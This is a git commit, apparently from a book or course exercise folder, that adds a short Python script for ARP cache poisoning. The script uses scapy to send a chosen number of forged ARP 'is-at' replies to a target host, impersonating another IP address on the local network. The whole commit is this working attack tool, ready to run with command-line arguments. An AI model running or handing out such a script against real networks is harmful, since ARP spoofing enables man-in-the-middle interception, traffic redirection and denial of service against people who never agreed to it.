170da256435f0b95bf6dd5c937ab2115c7d31d30
aminos <amri.amine@protonmail.com>
2018-11-16 19:36:52 +0100

    an arp poisoning script

---
+++ ch4/arp_poisoner.py
@@ -0,0 +1,36 @@
+#!/bin/env python
+# -*- coding: utf-8 -*-
+
+
+import sys
+import time
+from scapy.all import sendp, ARP, Ether
+
+
+def poison(iface, target, fake, n, s=1):
+
+    ethernet = Ether()
+    arp = ARP(pdst=target,
+              psrc=fake,
+              op="is-at")
+
+    packet = ethernet / arp
+
+    while n:
+        sendp(packet, iface=iface)
+        n -= 1
+        time.sleep(s)
+
+
+if __name__ == "__main__":
+
+    if len(sys.argv) != 5:
+        print("Usage: ptyhon scriptname.py ifname dst fake n")
+        sys.exit(1)
+
+    ifname = sys.argv[1]
+    dst = sys.argv[2]
+    fake = sys.argv[3]
+    n = int(sys.argv[4])
+
+    poison(ifname, dst, fake, n)
